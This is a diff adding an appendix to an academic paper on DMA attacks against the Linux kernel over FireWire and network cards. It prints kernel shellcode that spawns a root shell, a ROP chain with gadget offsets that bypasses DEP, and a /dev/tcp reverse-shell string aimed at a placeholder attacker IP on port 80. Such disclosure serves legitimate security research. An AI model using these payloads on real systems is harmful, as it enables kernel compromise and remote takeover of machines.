@@ -1,0 +1,110 @@
+\newpage
+\section{Shell Code}\label{apx:shellcode}
+To open the new shell, we used the built-in functionality the Linux kernel provides for spawning user processes with root privileges. This shellcode size is less than 100 bytes, which means that it fits into a single writable page. We used the same page where the initial attack took place, when possible. Finally, for all attacks, we validated that the shellcode was able to run when the computer is locked, successfully showing a gaining access scenario as well. We also implemented improved versions of this shellcode: We implemented a ROP payload based on this shellcode in order to bypass DEP protection. For the basic case, we implemented both the ROP and the regular version using fixed kernel pointers (e.g., function calls). When kASLR was enabled, we patched the payload during attack execution. Lastly, we replaced the string \textbf{\nobreak ``/sbin/getty -aroot tty9''}, which opens a local shell, with the string \textbf{\nobreak ``/bin/bash -c /bin/bash$>$\&/dev/tcp/{\normalfont \emph{attacker's IP}}/{\normalfont \emph{port}}$<$\&1''}, which opens a remote shell on the attacker's machine. We used port 80 (HTTP) in order to bypass firewalls, but any port could be used.
+\begin{figure}[h]
+        \begin{verbatim}
+;push ``/sbin/getty -aroot tty9''
+mov  rax, 0x003979747420746f
+push rax
+mov  rax, 0x6f72612d20797474
+push rax
+mov  rax, 0x65672f6e6962732f
+push rax
+
+xor  rdi, rdi
+mov  rsi, rsp
+xor  rdx, rdx
+mov  rax, <argv_split>
+call rax
+
+mov  rdi, qword [rax]
+mov  rsi, rax
+xor  rcx, rcx
+mov  rax, <call_usermodehelper>
+call rax
+
+pop  rax
+pop  rax
+pop  rax
+ret
+        \end{verbatim}
+        \caption{Shellcode for spawning a new local root shell from the kernel.}
+        \label{fig:shellcode_1}
+\end{figure}
+
+We implemented ROP payloads based on the shellcode used in the basic case (\ref{fig:shellcode_1}), showing that DEP could not prevent the attack. Using the ROP gadget tool1\footnote{https://github.com/JonathanSalwan/ROPgadget}, we searched Linux kernel binaries for gadgets that together achieve the same logic as the original shellcode. When we implemented the attack, we took advantage
+of the common practice of passing a ‘this’ pointer to a callback as the first parameter. According to the System V AMD64 ABI calling conventions (which Linux follows), the first parameter is passed in the rdi register, so the pivoting code can use it to find the new stack. Without it, we could not find the stack.
+We implemented two different versions, one for FireWire and one for NICs (Fig \ref{fig:shellcode_2}), of the ROP payloads. One minor difference between the versions is that in the network cards case, we used a modified OS and hence the binary was different. The more important difference is that in the NICs case, the callback was not pointed directly from the writable structure but had another level of indirection. As a result, the attacker could choose the address of the structure holding the callback and control rdi. This is essential for payload spraying, because the stack lies in the sprayed page, which has an arbitrary address. In the FireWire case, rdi is always pointing to the attacked sbp2 management orb, forcing the stack to be in the same page.
+\begin{figure*}
+                \begin{lstlisting}[
+        basicstyle = \scriptsize,
+        columns = fullflexible,
+        %frame = l,
+        language = C
+        ]
+KERNEL_BASE := 0xffffffff81000000; // patch using leaked pointers
+ATTACK_PAGE := 0xffff880043430000; // arbitrary selected address
+
+// Fake ubuf_info structure, starting with the callback pointer.
+// This is the entry point of the attack.
+page[0x000] = KERNEL_BASE + 0x6b511d; // call qword ptr[rdi + 0x3b0]
+
+// pivoting code
+page[0x3B0] = KERNEL_BASE + 0x1091fd; // mov rax, qword ptr [rdi + 0x68] ;
+                                            // mov rbp, rsp ; call qword ptr [rax]
+page[0x068] = &ATTACK_PAGE[0x100];
+page[0x100] = KERNEL_BASE + 0x2499c1; // mov rax, qword ptr [rax + 0x38] ;
+                                            // call qword ptr [rax + 0x28]
+page[0x138] = &ATTACK_PAGE[0x200];
+page[0x228] = KERNEL_BASE + 0x16fab6;   // mov rbx, qword ptr [rax + 8] ;
+                                            // mov rdi, rax ; call qword ptr [rax]
+page[0x208] = &ATTACK_PAGE[0x210];
+page[0x210] = KERNEL_BASE + 0x1319ee; // push rax; jmp qword ptr[rcx]
+page[0x200] = KERNEL_BASE + 0x2499c1; // mov rax, qword ptr [rax + 0x38] ;
+                                            // call qword ptr [rax + 0x28]
+page[0x238] = &ATTACK_PAGE[0x300];
+page[0x328] = KERNEL_BASE + 0x2ccb61; // mov rcx, qword ptr[rax + 8] ;
+                                            // mov rdi, rax; call qword ptr[rax]
+page[0x308] = &ATTACK_PAGE[0x310];
+page[0x310] = KERNEL_BASE + 0x159c86; // pop rsp ; ret
+page[0x300] = KERNEL_BASE + 0x20fb7b; // mov rax, qword ptr[rax + 0x30] ;
+                                            // mov r8, qword ptr[rax + 0x40] ;
+                                            // call qword ptr[rbx]
+
+page[0x330] = &ATTACK_PAGE[0xF68]; // our new stack :)
+
+// ``/sbin/getty -aroot tty9''
+page[0x400] = 0x65672f6e6962732f;
+page[0x408] = 0x6f72612d20797474;
+page[0x410] = 0x003979747420746f;
+
+// helping pointers
+page[0x500] = KERNEL_BASE + 0x0d7b05; // pop rsi; ret
+page[0x508] = KERNEL_BASE + 0x12dacd; // pop rdi; ret
+
+// stack
+page[0xF68] = KERNEL_BASE + 0x0d7b05; // pop rsi; ret
+page[0xF70] = &ATTACK_PAGE[0x400];
+page[0xF78] = KERNEL_BASE + 0x12dacd; // pop rdi; ret
+page[0xF80] = 0;
+page[0xF88] = KERNEL_BASE + 0x11bac2; // pop rdx ; ret
+page[0xF90] = 0;
+page[0xF98] = KERNEL_BASE + 0x3a00d0; // &argv_split
+page[0xFA0] = KERNEL_BASE + 0x005dfc; // pop rcx ; ret
+page[0xFA8] = &ATTACK_PAGE[0x500];
+page[0xFB0] = KERNEL_BASE + 0x1319ee; // push rax; jmp qword ptr[rcx]
+page[0xFB8] = KERNEL_BASE + 0x5822a2; // mov rax, qword ptr [rax] ; ret
+page[0xFC0] = KERNEL_BASE + 0x005dfc; // pop rcx ; ret
+page[0xFC8] = &ATTACK_PAGE[0x508];
+page[0xFD0] = KERNEL_BASE + 0x1319ee;// push rax; jmp qword ptr[rcx]
+page[0xFD8] = KERNEL_BASE + 0x005dfc;// pop rcx ; ret
+page[0xFE0] = 0;
+page[0xFE8] = KERNEL_BASE + 0x0896a0; // &call_usermodehelper
+page[0xFF0] = KERNEL_BASE + 0x4c0f0e; // xor rax, rax ; ret
+page[0xFF8] = KERNEL_BASE + 0x003795; // leave ; ret
+        \end{lstlisting}
+        \caption{
+                The pivoting code uses the \texttt{rdi} register, which is known
+                to point to the sprayed page.}
+        \label{fig:shellcode_2}
+\end{figure*}
